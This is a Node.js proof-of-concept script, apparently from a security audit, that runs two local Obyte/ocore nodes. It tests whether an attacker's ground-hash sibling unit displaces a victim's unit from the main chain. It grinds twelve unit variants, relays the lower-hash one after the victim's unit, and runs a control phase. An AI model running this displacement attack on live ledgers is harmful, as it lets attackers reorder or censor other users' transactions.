// E2-7 — F3 displacement empirical: does an attacker's ground-hash sibling unit reliably
// displace the victim's unit from the MC position on a real two-node network?
// ROLE=hub PORT=6611 NODE_PORT=6612 : full node (compose + relay via real ws protocol)
// ROLE=node PORT=6612              : full node listening; receives + stabilizes
"use strict";
const path = require("path");
const crypto = require("crypto");
const WebSocket = require("/Users/matheusvsky/Documents/trab/obyte-ocore-2026-08-ocore/node_modules/ws");
const { boot, keys, sleep } = require("./e17b-boot.js");

const ROLE = process.env.ROLE || "hub";
const PORT = parseInt(process.env.PORT || (ROLE === "hub" ? 6611 : 6612), 10);
const NODE_PORT = parseInt(process.env.NODE_PORT || 6612, 10);
const DATA = path.join(__dirname, ".e27-" + ROLE);

function dumpState(ctx, tag) {
	return ctx.query("SELECT unit, level, main_chain_index, is_stable, sequence, is_on_main_chain, witnessed_level FROM units ORDER BY main_chain_index").then(rows => {
		console.log("[" + tag + "] UNITS:", JSON.stringify(rows.map(r => ({ mci: r.main_chain_index, lvl: r.level, st: r.is_stable, seq: r.sequence, wl: r.witnessed_level, u: r.unit.slice(0, 10) }))));
		return rows;
	});
}

function openRelayClient(url) {
	return new Promise((resolve, reject) => {
		const ws = new WebSocket(url, { maxPayload: 6 * 1024 * 1024 });
		const timer = setTimeout(() => reject(new Error("ws connect timeout")), 8000);
		ws.on("error", e => { clearTimeout(timer); reject(new Error("ws error: " + e)); });
		ws.on("open", () => {
			clearTimeout(timer);
			ws.send(JSON.stringify(["justsaying", { subject: "version", body: {
				protocol_version: "4.0", alt: "1", library: "ocore",
				library_version: "0.4.6", program: "e27-lab", program_version: "0.0.1",
			} }]));
			ws.send(JSON.stringify(["request", { tag: "sub-e27", command: "subscribe", params: {
				subscription_id: "e27-sub", last_mci: 0, library_version: "0.4.6",
			} }]));
			resolve(ws);
		});
	});
}

function sendJoint(ws, joint) {
	ws.send(JSON.stringify(["justsaying", { subject: "joint", body: joint }]));
}

function fixedKey(seed) {
	let priv = Buffer.from(seed, "hex");
	if (!Buffer.from(seed, "hex").length || priv.length !== 32) priv = crypto.createHash("sha256").update(seed).digest();
	const ecdsa = require("/Users/matheusvsky/Documents/trab/obyte-ocore-2026-08-ocore/node_modules/secp256k1");
	return { priv: priv.toString("hex"), pub: Buffer.from(ecdsa.publicKeyCreate(priv, true)).toString("base64") };
}
const defOf = (k) => ["sig", { pubkey: k.pub }];

async function main() {
	const ctx = await boot(DATA, PORT, {});
	if (ROLE === "node") {
		await dumpState(ctx, "node-after-genesis");
		console.log("[node] listening on", PORT, "- waiting for the hub stream (180s watch)...");
		for (let i = 0; i < 180; i++) {
			await sleep(1000);
			const rows = await ctx.query("SELECT unit, main_chain_index, is_stable, is_on_main_chain, witnessed_level, level FROM units WHERE unit != ? ORDER BY main_chain_index", [ctx.genesis.unit]);
			if (i % 5 === 0)
				console.log("[node:" + i + "s] " + JSON.stringify(rows.map(r => ({ mci: r.main_chain_index, st: r.is_stable, seq: r.sequence, u: r.unit.slice(0, 10) }))));
			const stable = rows.filter(r => r.is_stable === 1).length;
			if (stable >= 6)
				break;
		}
		const final = await dumpState(ctx, "node-final");
		const balls = await ctx.query("SELECT COUNT(*) AS c FROM balls");
		console.log("NODE-DONE stable=" + final.filter(r => r.is_stable === 1).length + " balls=" + balls[0].c);
		process.exit(0);
	}

	// ---- HUB ----
	const user2 = fixedKey("e27-user2-fixed-seed-00000000000000000000000000000000");
	const user2_addr = ctx.objectHash.getChash160(defOf(user2));
	console.log("[hub] user2 addr:", user2_addr);
	await sleep(1000);
	const ws = await openRelayClient("ws://127.0.0.1:" + NODE_PORT);

	// 1) SETUP-1: split the user's genesis output into 4 explicit outputs (2x user, 2x user2)
	//    so each phase has its own spendable input.
	const setup = await new Promise((resolve, reject) => {
		ctx.composer.composeJoint({
			paying_addresses: [ctx.user_addr],
			signing_addresses: [ctx.user_addr],
			outputs: [
				{ address: ctx.user_addr, amount: 0 },
				{ address: ctx.user_addr, amount: 50000000000000 },
				{ address: ctx.user_addr, amount: 50000000000000 },
				{ address: user2_addr, amount: 50000000000000 },
				{ address: user2_addr, amount: 50000000000000 },
			],
			messages: [{ app: "text", payload_location: "inline", payload: "SETUP-SPLIT" }],
			signer: (() => {
				const ecdsa = require("/Users/matheusvsky/Documents/trab/obyte-ocore-2026-08-ocore/node_modules/secp256k1");
				const sig = (hashBuf, privHex) => Buffer.from(ecdsa.ecdsaSign(hashBuf, Buffer.from(privHex, "hex")).signature).toString("base64");
				return {
					readDefinition: (c, a, cb) => cb(null, defOf(keys.user)),
					readSigningPaths: (c, a, cb) => cb({ r: ctx.constants.SIG_LENGTH }),
					readPrivateKey: (address, p, cb) => cb(null, Buffer.from(keys.user.priv, "hex")),
					sign: (hashBuf, signingPath, cb) => cb(sig(hashBuf, keys.user.priv)),
				};
			})(),
			callbacks: {
				ifOk: (j, p, u) => { u(); resolve(j); },
				ifError: (e) => reject(new Error("SETUP compose error: " + JSON.stringify(e).slice(0, 250))),
				ifNotEnoughFunds: (e) => reject(new Error("SETUP not enough funds: " + e)),
			},
		});
	});
	await ctx.validateAndSave(setup, "SETUP-SPLIT");
	sendJoint(ws, setup);
	await sleep(1500);

	// 2) compose C (user) + A variants (user2) BEFORE relaying any of them -> same parents -> siblings
	const C = await ctx.composeUnit(keys.user, ctx.user_addr, "VICTIM-C");
	const cHash = C.unit.unit;
	const A_variants = [];
	for (let i = 0; i < 12; i++) {
		const label = "GRIND-" + String(i).padStart(3, "0") + "-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
		const a = await ctx.composeUnit(user2, user2_addr, label);
		A_variants.push({ label: label.slice(0, 8), unit: a.unit.unit, joint: a });
	}
	A_variants.sort((x, y) => (x.unit < y.unit ? -1 : 1));
	const A_ground = A_variants.find(v => v.unit < cHash) || A_variants[0];
	const A_control = A_variants.find(v => v.unit > cHash) || A_variants[A_variants.length - 1];
	console.log("[hub] C hash:", cHash.slice(0, 16));
	console.log("[hub] A_ground=" + A_ground.unit.slice(0, 16) + " below-C=" + (A_ground.unit < cHash));
	console.log("[hub] A_control=" + A_control.unit.slice(0, 16) + " above-C=" + (A_control.unit > cHash));

	// 3) PHASE-1: relay C then A_ground. Expect A_ground (lower hash) to displace C.
	await ctx.validateAndSave(C, "VICTIM-C");
	sendJoint(ws, C);
	await sleep(3000);
	console.log("[hub] after C relayed");
	await ctx.validateAndSave(A_ground.joint, "A_ground");
	sendJoint(ws, A_ground.joint);
	console.log("[hub] relayed A_ground (lower hash) — displacement expected");
	await sleep(5000);

	// 4) PHASE-2 (control): C2 (user, second output) then A_control (user2, second output).
	const C2 = await ctx.composeUnit(keys.user, ctx.user_addr, "VICTIM-C2");
	const ac = A_control.joint;
	console.log("[hub] C2 hash:", C2.unit.unit.slice(0, 16), "A_control hash:", ac.unit.unit.slice(0, 16));
	await ctx.validateAndSave(C2, "VICTIM-C2");
	sendJoint(ws, C2);
	await sleep(3000);
	await ctx.validateAndSave(ac, "A_control");
	sendJoint(ws, ac);
	console.log("[hub] relayed A_control (higher hash) — no displacement expected");
	await sleep(5000);

	// 5) WAYPOINTs to stabilize the MC path.
	for (let i = 1; i <= 5; i++) {
		const w = await ctx.composeUnit(keys.witness, ctx.witness_addr, "WAYPOINT-" + i);
		await ctx.validateAndSave(w, "WAYPOINT-" + i);
		sendJoint(ws, w);
		await sleep(700);
	}
	await sleep(6000);
	await dumpState(ctx, "hub-final");
	console.log("HUB-DONE");
	process.exit(0);
}

main().catch(e => { console.error(ROLE + "-ERR:", e); process.exit(2); });
